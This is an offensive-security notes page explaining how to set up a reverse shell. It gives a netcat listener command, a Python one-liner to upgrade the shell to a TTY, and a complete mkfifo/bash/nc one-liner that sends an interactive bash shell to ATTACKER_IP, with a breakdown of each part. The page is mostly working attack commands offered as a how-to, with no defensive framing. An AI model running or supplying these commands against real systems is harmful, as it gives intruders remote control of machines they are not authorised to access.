---
description: >-
  Reffered as "connect back shell" is one of the most popular techniques for
  gaining access to a system in cyberattacks.
---

# Reverse Shell

To setup a reverse shell, we need to setup first a `Netcat Listener` on the attackers machine

```sh
nc -lvnp <port>
```

* -l means to way for connection
* -v enable verbose mode
* -n prevents connections from using DNS for lookup
* -p idicates the port that will be used to wait connection

### Upgrade a shell to tty

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### To gain reverse shell access

{% code overflow="wrap" %}
```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
{% endcode %}

* `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
* `mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
* `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
* `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
* `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
* `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.



{% embed url="https://www.hackercoolmagazine.com/wordpress-reverse-shelling-multiple-methods/" %}
